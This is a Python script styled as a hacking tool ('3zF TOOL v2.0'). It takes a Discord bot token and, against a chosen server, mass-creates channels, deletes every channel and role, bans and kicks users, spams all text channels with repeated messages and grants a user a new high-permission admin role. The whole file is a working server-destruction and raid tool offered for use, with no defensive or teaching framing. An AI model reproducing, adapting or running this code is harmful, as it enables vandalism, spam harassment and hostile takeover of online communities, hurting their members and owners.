import requests
import json
import os
import time
import random

os.system('cls' if os.name == 'nt' else 'clear')

print("""
██████╗ ███████╗███████╗
╚════██╗╚══███╔╝██╔════╝
 █████╔╝  ███╔╝ █████╗
 ╚═══██╗ ███╔╝  ██╔══╝
██████╔╝███████╗██║
╚═════╝ ╚══════╝╚═╝
""")
print("="*50)
print("        3zF TOOL v2.0 | BY 3Z")
print("="*50)
print()

# ============== GET TOKEN ==============
print("[?] Enter Bot Token: ", end="")
TOKEN = input().strip()

headers = {
    "Authorization": f"Bot {TOKEN}",
    "User-Agent": "Mozilla/5.0"
}

# ============== TEST TOKEN ==============
print("\n[*] Testing Token...")
try:
    r = requests.get("https://discord.com/api/v10/users/@me", headers=headers)
    if r.status_code == 200:
        user = r.json()
        print(f"[+] Connected as: {user['username']}")
    else:
        print(f"[-] Invalid Token! Status: {r.status_code}")
        exit()
except:
    print("[-] Connection Error!")
    exit()

# ============== GET SERVERS ==============
print("\n[*] Fetching Servers...")
try:
    r = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers)
    if r.status_code == 200:
        guilds = r.json()
        if len(guilds) == 0:
            print("[-] No servers found! Make sure bot is in a server.")
            exit()
        
        print("\n[+] Available Servers:")
        print("-"*50)
        server_list = {}
        for i, g in enumerate(guilds, 1):
            print(f"  [{i}] {g['name']} (ID: {g['id']})")
            server_list[str(i)] = g['id']
        print("-"*50)
        
        print("\n[?] Select Server Number: ", end="")
        choice = input().strip()
        
        if choice not in server_list:
            print("[-] Invalid choice!")
            exit()
        
        GUILD_ID = server_list[choice]
        print(f"[+] Selected Server ID: {GUILD_ID}")
        print("\n[+] Press Enter to continue...")
        input()
    else:
        print(f"[-] Failed! Status: {r.status_code}")
        exit()
except:
    print("[-] Connection Error!")
    exit()

# ============== MAIN MENU ==============
while True:
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print("""
██████╗ ███████╗███████╗
╚════██╗╚══███╔╝██╔════╝
 █████╔╝  ███╔╝ █████╗
 ╚═══██╗ ███╔╝  ██╔══╝
██████╔╝███████╗██║
╚═════╝ ╚══════╝╚═╝
""")
    print("="*50)
    print("        3zF TOOL v2.0 | BY 3Z")
    print("="*50)
    print(f"Server ID: {GUILD_ID}")
    print("-"*50)
    print("  [1] Create Rooms")
    print("  [2] Delete Rooms")
    print("  [3] Delete Roles")
    print("  [4] Ban User")
    print("  [5] Kick User")
    print("  [6] Spam Rooms")
    print("  [7] Give Admin")
    print("  [0] Exit")
    print("-"*50)
    
    choice = input("[?] Choose Option: ").strip()
    
    # ============== CREATE ROOMS ==============
    if choice == "1":
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\n[+] CREATE ROOMS")
        print("-"*50)
        
        rooms = []
        print("[?] Enter room names (type 'done' to finish):")
        while True:
            name = input(f"  Room {len(rooms)+1}: ").strip()
            if name.lower() == "done":
                break
            if name:
                rooms.append(name)
        
        if not rooms:
            print("[-] No rooms entered!")
            input("\nPress Enter to continue...")
            continue
        
        print(f"\n[?] How many copies of each room? ", end="")
        try:
            copies = int(input().strip())
            if copies <= 0:
                copies = 1
        except:
            copies = 1
        
        final_rooms = []
        for room in rooms:
            for i in range(copies):
                final_rooms.append(f"{room}-{i+1}" if copies > 1 else room)
        
        print(f"\n[*] Creating {len(final_rooms)} rooms...")
        
        success = 0
        for i, room in enumerate(final_rooms):
            data = {"name": room, "type": 0}
            try:
                r = requests.post(
                    f"https://discord.com/api/v10/guilds/{GUILD_ID}/channels",
                    headers=headers,
                    json=data
                )
                if r.status_code in [200, 201]:
                    success += 1
                else:
                    pass
            except:
                pass
            print(f"\r[+] Created: {success}/{len(final_rooms)}", end="")
        
        print(f"\n[+] Created {success} rooms!")
        input("\nPress Enter to continue...")
    
    # ============== DELETE ROOMS ==============
    elif choice == "2":
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\n[+] DELETE ROOMS")
        print("-"*50)
        
        print("[*] Fetching channels...")
        try:
            r = requests.get(f"https://discord.com/api/v10/guilds/{GUILD_ID}/channels", headers=headers)
            if r.status_code == 200:
                channels = r.json()
                channel_ids = [c['id'] for c in channels if c['type'] in [0, 2]]
                
                if not channel_ids:
                    print("[-] No channels found!")
                    input("\nPress Enter to continue...")
                    continue
                
                print(f"[*] Found {len(channel_ids)} channels")
                print(f"[?] Delete all {len(channel_ids)} channels? (yes/no): ", end="")
                confirm = input().strip().lower()
                
                if confirm != "yes":
                    print("[-] Cancelled!")
                    input("\nPress Enter to continue...")
                    continue
                
                success = 0
                for i, cid in enumerate(channel_ids):
                    try:
                        r = requests.delete(f"https://discord.com/api/v10/channels/{cid}", headers=headers)
                        if r.status_code in [200, 204]:
                            success += 1
                    except:
                        pass
                    print(f"\r[+] Deleted: {success}/{len(channel_ids)}", end="")
                
                print(f"\n[+] Deleted {success} channels!")
            else:
                print("[-] Failed to fetch channels!")
        except:
            print("[-] Error!")
        input("\nPress Enter to continue...")
    
    # ============== DELETE ROLES ==============
    elif choice == "3":
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\n[+] DELETE ROLES")
        print("-"*50)
        
        print("[*] Fetching roles...")
        try:
            r = requests.get(f"https://discord.com/api/v10/guilds/{GUILD_ID}/roles", headers=headers)
            if r.status_code == 200:
                roles = r.json()
                role_ids = [r['id'] for r in roles if r['id'] != GUILD_ID]
                
                if not role_ids:
                    print("[-] No roles found!")
                    input("\nPress Enter to continue...")
                    continue
                
                print(f"[*] Found {len(role_ids)} roles")
                print(f"[?] Delete all {len(role_ids)} roles? (yes/no): ", end="")
                confirm = input().strip().lower()
                
                if confirm != "yes":
                    print("[-] Cancelled!")
                    input("\nPress Enter to continue...")
                    continue
                
                success = 0
                for i, rid in enumerate(role_ids):
                    try:
                        r = requests.delete(f"https://discord.com/api/v10/guilds/{GUILD_ID}/roles/{rid}", headers=headers)
                        if r.status_code in [200, 204]:
                            success += 1
                    except:
                        pass
                    print(f"\r[+] Deleted: {success}/{len(role_ids)}", end="")
                
                print(f"\n[+] Deleted {success} roles!")
            else:
                print("[-] Failed to fetch roles!")
        except:
            print("[-] Error!")
        input("\nPress Enter to continue...")
    
    # ============== BAN USER ==============
    elif choice == "4":
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\n[+] BAN USER")
        print("-"*50)
        
        user_id = input("[?] User ID to ban: ").strip()
        if not user_id:
            print("[-] User ID required!")
            input("\nPress Enter to continue...")
            continue
        
        try:
            data = {"delete_message_days": 7}
            r = requests.put(
                f"https://discord.com/api/v10/guilds/{GUILD_ID}/bans/{user_id}",
                headers=headers,
                json=data
            )
            if r.status_code in [200, 204]:
                print(f"[+] User {user_id} banned!")
            else:
                print(f"[-] Failed! Status: {r.status_code}")
        except:
            print("[-] Error!")
        input("\nPress Enter to continue...")
    
    # ============== KICK USER ==============
    elif choice == "5":
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\n[+] KICK USER")
        print("-"*50)
        
        user_id = input("[?] User ID to kick: ").strip()
        if not user_id:
            print("[-] User ID required!")
            input("\nPress Enter to continue...")
            continue
        
        try:
            r = requests.delete(
                f"https://discord.com/api/v10/guilds/{GUILD_ID}/members/{user_id}",
                headers=headers
            )
            if r.status_code in [200, 204]:
                print(f"[+] User {user_id} kicked!")
            else:
                print(f"[-] Failed! Status: {r.status_code}")
        except:
            print("[-] Error!")
        input("\nPress Enter to continue...")
    
    # ============== SPAM ROOMS ==============
    elif choice == "6":
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\n[+] SPAM ROOMS")
        print("-"*50)
        
        messages = []
        print("[?] Enter messages (type 'done' to finish):")
        while True:
            msg = input(f"  Message {len(messages)+1}: ").strip()
            if msg.lower() == "done":
                break
            if msg:
                messages.append(msg)
        
        if not messages:
            print("[-] No messages entered!")
            input("\nPress Enter to continue...")
            continue
        
        print(f"\n[?] How many times per room? ", end="")
        try:
            per_room = int(input().strip())
            if per_room <= 0:
                per_room = 1
        except:
            per_room = 1
        
        print("\n[*] Fetching text channels...")
        try:
            r = requests.get(f"https://discord.com/api/v10/guilds/{GUILD_ID}/channels", headers=headers)
            if r.status_code == 200:
                channels = r.json()
                text_channels = [c['id'] for c in channels if c['type'] == 0]
                
                if not text_channels:
                    print("[-] No text channels found!")
                    input("\nPress Enter to continue...")
                    continue
                
                print(f"[*] Found {len(text_channels)} text channels")
                print("[*] Spamming...")
                
                total = 0
                for cid in text_channels:
                    for _ in range(per_room):
                        msg = random.choice(messages)
                        try:
                            data = {"content": msg}
                            r = requests.post(
                                f"https://discord.com/api/v10/channels/{cid}/messages",
                                headers=headers,
                                json=data
                            )
                            if r.status_code in [200, 201]:
                                total += 1
                        except:
                            pass
                        print(f"\r[+] Sent: {total} messages", end="")
                
                print(f"\n[+] Sent {total} messages to {len(text_channels)} rooms!")
            else:
                print("[-] Failed to fetch channels!")
        except:
            print("[-] Error!")
        input("\nPress Enter to continue...")
    
    # ============== GIVE ADMIN ==============
    elif choice == "7":
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\n[+] GIVE ADMIN")
        print("-"*50)
        
        user_id = input("[?] User ID to promote: ").strip()
        if not user_id:
            print("[-] User ID required!")
            input("\nPress Enter to continue...")
            continue
        
        print("[*] Creating admin role...")
        try:
            role_data = {
                "name": "3zF-Admin",
                "permissions": "1071698660929",
                "color": 10053376,
                "hoist": True
            }
            r = requests.post(
                f"https://discord.com/api/v10/guilds/{GUILD_ID}/roles",
                headers=headers,
                json=role_data
            )
            if r.status_code in [200, 201]:
                role = r.json()
                role_id = role['id']
                print(f"[+] Role created! ID: {role_id}")
                
                print("[*] Assigning role...")
                assign_data = {"roles": [role_id]}
                r2 = requests.patch(
                    f"https://discord.com/api/v10/guilds/{GUILD_ID}/members/{user_id}",
                    headers=headers,
                    json=assign_data
                )
                if r2.status_code in [200, 204]:
                    print(f"[+] User {user_id} is now admin!")
                else:
                    print("[-] Role created but failed to assign!")
            else:
                print("[-] Failed to create role!")
        except:
            print("[-] Error!")
        input("\nPress Enter to continue...")
    
    # ============== EXIT ==============
    elif choice == "0":
        print("\n[+] Goodbye!")
        break
    
    else:
        print("[-] Invalid option!")
        time.sleep(1)
